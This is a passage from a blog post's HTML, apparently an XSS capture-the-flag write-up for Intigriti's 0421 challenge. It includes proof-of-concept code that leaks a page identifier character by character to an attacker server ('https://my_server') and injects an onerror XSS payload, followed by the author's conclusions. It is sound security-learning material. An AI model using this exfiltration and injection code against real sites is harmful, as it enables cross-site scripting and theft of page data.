+    payload <span class="token operator">=</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+    <span class="token keyword">var</span> baseUrl <span class="token operator">=</span> <span class="token string">'https://my_server'</span>
+
+    <span class="token comment">// reset first</span>
+    <span class="token function">fetch</span><span class="token punctuation">(</span>baseUrl <span class="token operator">+</span> <span class="token string">'/reset'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+      <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token comment">// assume identifier start with 1</span>
+      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'POC started'</span><span class="token punctuation">)</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>xssWindow<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        window<span class="token punctuation">.</span>xssWindow<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+      <span class="token punctuation">&#125;</span>
+
+      window<span class="token punctuation">.</span>xssWindow <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">https://challenge-0421.intigriti.io/?error=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>payload<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">#1</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token string">'_blank'</span><span class="token punctuation">)</span>
+
+      <span class="token function">polling</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">function</span> <span class="token function">polling</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token function">fetch</span><span class="token punctuation">(</span>baseUrl <span class="token operator">+</span> <span class="token string">'/polling'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> res<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">token</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+
+        <span class="token comment">// guess fail, restart</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>token <span class="token operator">===</span> <span class="token string">'1zz'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+          <span class="token function">fetch</span><span class="token punctuation">(</span>baseUrl <span class="token operator">+</span> <span class="token string">'/reset'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'guess fail, restart'</span><span class="token punctuation">)</span>
+            <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+          <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+          <span class="token keyword">return</span>
+        <span class="token punctuation">&#125;</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>length <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+          window<span class="token punctuation">.</span>xssWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
+            <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'waf'</span><span class="token punctuation">,</span>
+            <span class="token literal-property property">identifier</span><span class="token operator">:</span> token<span class="token punctuation">,</span>
+            <span class="token literal-property property">str</span><span class="token operator">:</span> <span class="token string">'&lt;img src=xxx onerror=alert("flag&#123;THIS_IS_THE_FLAG&#125;")>'</span><span class="token punctuation">,</span>
+            <span class="token literal-property property">safe</span><span class="token operator">:</span> <span class="token boolean">true</span>
+          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span>
+
+        window<span class="token punctuation">.</span>xssWindow<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">https://challenge-0421.intigriti.io/?error=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>payload<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">#</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>token<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>
+
+        <span class="token comment">// After POC finsihed, polling will timeout and got error message, I don't want to print the message</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+          <span class="token keyword">return</span>
+        <span class="token punctuation">&#125;</span>
+
+        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'token:'</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span>
+        <span class="token function">polling</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The server-side code is written very casually, is ugly, and has bugs:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span><span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+  res<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Access-Control-Allow-Origin'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+<span class="token keyword">const</span> handlerDelay <span class="token operator">=</span> <span class="token number">100</span>
+<span class="token keyword">const</span> loopDelay <span class="token operator">=</span> <span class="token number">550</span>
+
+<span class="token keyword">var</span> initialData <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+  <span class="token literal-property property">count</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
+  <span class="token literal-property property">token</span><span class="token operator">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span>
+  <span class="token literal-property property">canStartLoop</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
+  <span class="token literal-property property">loopStarted</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
+  <span class="token literal-property property">canSendBack</span><span class="token operator">:</span> <span class="token boolean">false</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">var</span> data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token operator">...</span>initialData<span class="token punctuation">&#125;</span>
+
+app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/reset'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+  data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token operator">...</span>initialData<span class="token punctuation">&#125;</span>
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'======reset====='</span><span class="token punctuation">)</span>
+  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'reset ok'</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/polling'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">function</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>canSendBack<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      data<span class="token punctuation">.</span>canSendBack <span class="token operator">=</span> <span class="token boolean">false</span>
+      res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>
+      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>token<span class="token punctuation">)</span>
+      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'send back token:'</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span>token<span class="token punctuation">)</span>
+
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>token<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">14</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+          data<span class="token punctuation">.</span>canStartLoop <span class="token operator">=</span> <span class="token boolean">true</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> loopDelay<span class="token punctuation">)</span>
+      <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+      <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+        <span class="token function">handle</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span>
+      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> handlerDelay<span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token function">handle</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/loop'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">function</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>canStartLoop<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      data<span class="token punctuation">.</span>canStartLoop <span class="token operator">=</span> <span class="token boolean">false</span>
+      res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>
+      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+      <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+        <span class="token function">handle</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span>
+      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> handlerDelay<span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token function">handle</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/:char'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+  <span class="token comment">// already start stealing identifier</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>char<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span>
+  <span class="token punctuation">&#125;</span>
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'char received'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>char<span class="token punctuation">)</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>loopStarted<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    data<span class="token punctuation">.</span>token <span class="token operator">+=</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>char
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'token:'</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span>token<span class="token punctuation">)</span>
+    data<span class="token punctuation">.</span>canSendBack <span class="token operator">=</span> <span class="token boolean">true</span>
+
+    res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>
+    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> 
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token comment">// first round</span>
+  data<span class="token punctuation">.</span>count<span class="token operator">++</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>count <span class="token operator">===</span> <span class="token number">36</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'initial image loaded, start loop'</span><span class="token punctuation">)</span>
+    data<span class="token punctuation">.</span>count <span class="token operator">=</span> <span class="token number">0</span>
+    data<span class="token punctuation">.</span>loopStarted <span class="token operator">=</span> <span class="token boolean">true</span>
+    data<span class="token punctuation">.</span>canStartLoop <span class="token operator">=</span> <span class="token boolean">true</span>
+  <span class="token punctuation">&#125;</span>
+  res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>
+  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">5555</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'5555'</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2><span id="conclusion">Conclusion</span></h2><p>I learned a lot from this XSS challenge, such as:</p>
+<ol>
+<li>Using <code>img src</code> + <code>onerror</code> to create a loop (actually, it should be recursion).</li>
+<li>Using <code>img src</code> + <code>srcset</code> to repeatedly load images.</li>
+<li>Using <code>location.hash</code> to exchange information.</li>
+<li>Thinking about problems in a different way, using <code>&gt;</code> and <code>&lt;</code> instead of <code>==</code>, and using comparison instead of equality.</li>
+<li>Using <code>/a/.source</code> or <code>img.alt</code> to replace strings, instead of constructing strings with single or double backticks.</li>
+</ol>
+<p>Although it took a lot of time, the sense of accomplishment when I solved it was great, and because it was a difficult problem, the sense of accomplishment was even greater.</p>
+<p>This article mainly describes my own solution, which is a bit cumbersome (because it requires server-side code), but it is the only solution I can think of.</p>
+<p>If nothing unexpected happens, the next article will introduce the official solution, which uses an element that I don’t know how to use and completely ignored: <code>&lt;object&gt;</code>.</p>
+
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Front-end/">#Front-end</a></span>
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Security/">#Security</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
+            
+            <a href="/2021/06/07/en/xss-challenge-by-intigriti-writeup-may/">Intigriti&#39;s 0521 XSS Challenge Solution: Limited Character Combination Code</a>
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2021/05/25/en/prevent-xss-is-not-that-easy/">Preventing XSS may be more difficult than you think</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+<div class="comments">
+    <h3 class="title is-4">Comments</h3>
+    <script src="https://utteranc.es/client.js"
+        repo="aszx87410/huli-blog"
+        issue-term="title"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+</div>
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2023 Huli&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+<div class="column is-narrow has-text-centered">
+    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
+        <div class="dropdown-trigger">
+            <button class="button is-small" aria-haspopup="true">
+                <span class="icon">
+                    <i class="fas fa-globe"></i>
+                </span>
+                <span>English</span>
+                <span class="icon is-small">
+            <i class="fas fa-angle-down" aria-hidden="true"></i>
+          </span>
+            </button>
+        </div>
+        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
+            <div class="dropdown-content">
+            <!-- NOTE: 永遠回到首頁 -->
+            
+                <a href="/2021/05/25/xss-challenge-by-intigriti-writeup/" class="dropdown-item">
+                    繁體中文
+                </a>
+            
+            </div>
+        </div>
+    </div>
+</div>
+
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+
+
+
+    
+    
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js?v=3.js"></script>
+
+
+    
+</body>
+</html>
